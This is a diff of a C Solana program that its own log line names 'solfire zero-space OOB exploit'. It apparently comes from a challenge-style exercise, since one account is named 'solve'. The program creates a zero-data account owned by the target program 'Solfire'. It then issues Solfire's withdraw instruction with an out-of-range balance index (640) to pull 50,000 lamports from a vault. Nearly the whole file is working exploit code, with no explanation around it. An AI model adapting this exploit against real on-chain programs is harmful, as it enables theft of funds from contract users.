@@ -1,6 +1,4 @@
 #include <solana_sdk.h>
-#include <stdint.h>
-#include <stddef.h>
 
 #define TARGET_LAMPORTS 50000u
 #define BALANCE_INDEX   640u
@@ -38,32 +36,72 @@ static uint64_t run(const uint8_t *input)
     }
 
     /*
-     * Input data:
-     *   byte 0 = Solfire PDA bump
-     *   byte 1 = balances PDA bump
-     *   byte 2 = vault PDA bump
+     * Accounts:
+     * 0 = clock
+     * 1 = system
+     * 2 = user
+     * 3 = vault
+     * 4 = solfire
+     * 5 = solve
+     * 6 = balances PDA
+     *
+     * Input:
+     * 0 = balances PDA bump
+     * 1 = vault PDA bump
      */
-    if (params.ka_num != 7 || params.data_len != 3) {
+    if (params.ka_num != 7 || params.data_len != 2) {
         return ERROR_INVALID_ARGUMENT;
     }
 
-    const SolPubkey *clock_key   = params.ka[0].key;
-    const SolPubkey *system_key  = params.ka[1].key;
-    const SolPubkey *user_key    = params.ka[2].key;
-    const SolPubkey *vault_key   = params.ka[3].key;
-    const SolPubkey *solfire_key = params.ka[4].key;
-    const SolPubkey *balance_key = params.ka[6].key;
+    SolPubkey *clock_key =
+        (SolPubkey *)params.ka[0].key;
+
+    SolPubkey *system_key =
+        (SolPubkey *)params.ka[1].key;
+
+    SolPubkey *user_key =
+        (SolPubkey *)params.ka[2].key;
+
+    SolPubkey *vault_key =
+        (SolPubkey *)params.ka[3].key;
+
+    SolPubkey *solfire_key =
+        (SolPubkey *)params.ka[4].key;
+
+    SolPubkey *balance_key =
+        (SolPubkey *)params.ka[6].key;
 
     /*
-     * Create the zero-space balances PDA.
+     * Create a zero-data account owned by solfire.
      */
     uint8_t create_data[52];
-    sol_memset(create_data, 0, sizeof(create_data));
 
-    write_u32(create_data, 0);
-    write_u64(create_data + 4, 1);
-    write_u64(create_data + 12, 0);
-    sol_memcpy(create_data + 20, solfire_key, 32);
+    sol_memset(
+        create_data,
+        0,
+        sizeof(create_data)
+    );
+
+    write_u32(
+        create_data,
+        0
+    );
+
+    write_u64(
+        create_data + 4,
+        1
+    );
+
+    write_u64(
+        create_data + 12,
+        0
+    );
+
+    sol_memcpy(
+        create_data + 20,
+        solfire_key,
+        32
+    );
 
     SolAccountMeta create_metas[] = {
         { user_key,    1, 1 },
@@ -79,11 +117,11 @@ static uint64_t run(const uint8_t *input)
     };
 
     /*
-     * Balances PDA seeds: ["A", balances_bump]
+     * PDA seed = "A" + balances bump
      */
     uint8_t seed_data[] = {
         'A',
-        params.data[1]
+        params.data[0]
     };
 
     SolSignerSeed seed = {
@@ -108,20 +146,37 @@ static uint64_t run(const uint8_t *input)
     }
 
     /*
-     * Solfire withdraw instruction:
+     * Solfire withdraw:
      *
-     * u32 instruction = 2
-     * u32 balance index = 640
-     * u32 lamports = 50000
-     * u32 Solfire PDA bump
+     * opcode        = 2
+     * balance_index = 640
+     * lamports      = 50000
+     * vault bump
      */
-    uint8_t withdraw_data[16];
-    sol_memset(withdraw_data, 0, sizeof(withdraw_data));
+    uint8_t withdraw_data[13];
 
-    write_u32(withdraw_data, 2);
-    write_u32(withdraw_data + 4, BALANCE_INDEX);
-    write_u32(withdraw_data + 8, TARGET_LAMPORTS);
-    write_u32(withdraw_data + 12, params.data[0]);
+    sol_memset(
+        withdraw_data,
+        0,
+        sizeof(withdraw_data)
+    );
+
+    write_u32(
+        withdraw_data,
+        2
+    );
+
+    write_u32(
+        withdraw_data + 4,
+        BALANCE_INDEX
+    );
+
+    write_u32(
+        withdraw_data + 8,
+        TARGET_LAMPORTS
+    );
+
+    withdraw_data[12] = params.data[1];
 
     SolAccountMeta withdraw_metas[] = {
         { clock_key,   0, 0 },
@@ -148,6 +203,9 @@ static uint64_t run(const uint8_t *input)
 
 extern uint64_t entrypoint(const uint8_t *input)
 {
-    sol_log("solfire zero-space OOB exploit");
+    sol_log(
+        "solfire zero-space OOB exploit"
+    );
+
     return run(input);
 }
